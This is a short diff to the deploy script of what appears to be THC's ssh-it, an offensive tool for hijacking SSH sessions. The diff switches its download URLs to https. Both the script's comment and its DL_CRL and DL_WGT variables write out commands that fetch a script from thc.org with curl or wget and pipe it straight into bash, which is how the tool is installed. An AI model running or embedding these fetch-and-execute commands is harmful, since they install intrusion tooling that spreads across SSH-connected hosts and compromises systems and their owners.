@@ -5,7 +5,7 @@
 # See https://www.thc.org/ssh-it/ for more details.
 #
 # This script is typically invoked likes this:
-# 	$ bash -c "$(curl -fsSL thc.org/ssh-it/x)"
+# 	$ bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
 #
 # Environment variables:
 #
@@ -20,7 +20,7 @@
 # THC_TMPDIR=/tmp/foobar - Use custom temp directory
 
 URL_BASE="https://github.com/hackerschoice/binary/raw/main/ssh-it/"
-URL_DEPLOY="ssh-it.thc.org/x"
+URL_DEPLOY="https://thc.org/ssh-it/x"
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
 PKG_NAME="ssh-it-pkg"
